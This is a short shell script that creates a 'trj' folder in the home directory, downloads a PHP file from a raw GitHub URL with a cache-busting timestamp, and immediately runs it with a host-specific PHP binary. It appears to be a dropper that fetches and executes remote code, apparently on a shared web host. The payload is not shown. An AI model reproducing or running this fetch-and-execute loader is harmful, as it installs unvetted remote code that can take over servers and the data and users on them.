#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
curl -fsSL -o fxdiag7.php.new "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/fxdiag7.php?t=$(date +%s)" && mv fxdiag7.php.new fxdiag7.php
/opt/alt/php83/usr/bin/php fxdiag7.php "$1"
